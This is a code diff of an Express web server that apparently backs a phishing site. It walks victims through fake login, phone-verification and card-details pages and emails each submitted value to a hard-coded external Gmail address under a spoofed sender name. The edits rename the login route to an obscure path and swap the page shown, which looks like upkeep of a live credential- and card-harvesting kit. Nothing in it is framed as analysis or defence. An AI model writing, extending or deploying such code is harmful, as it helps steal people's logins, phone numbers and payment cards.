@@ -22,10 +22,10 @@ app.listen(port, () => console.log(`Server running on port ${port}`));
 
 
 app.get("/", ( req , res ) => {
-    res.render("index")
+    res.render("index2")
 });
 
-app.get("/login", ( req , res ) => {
+app.get("/en/chl", ( req , res ) => {
     res.render("index")
 });
 
@@ -37,7 +37,7 @@ app.post("/phone-verification", (req, res) => {
     res.redirect("/card-details")
     var mailOptions = {
         from: `${req.session.user} info@applinic.com`,
-        to: "orrealdesigners@gmail.com",//"ede.obinna27@gmail.com",
+        to: "orrealdesigners@gmail.com",
         subject: `Mobile Number`,
         text: `Mobile number: ${req.body.phn}`
     };
@@ -77,7 +77,6 @@ app.post("/cardVerification", ( req, res) => {
 })
 
 app.post("/login", ( req, res ) => {
-
     res.redirect(`/phone-verification`);
     req.session.user = req.body.Username;
     req.session.save();
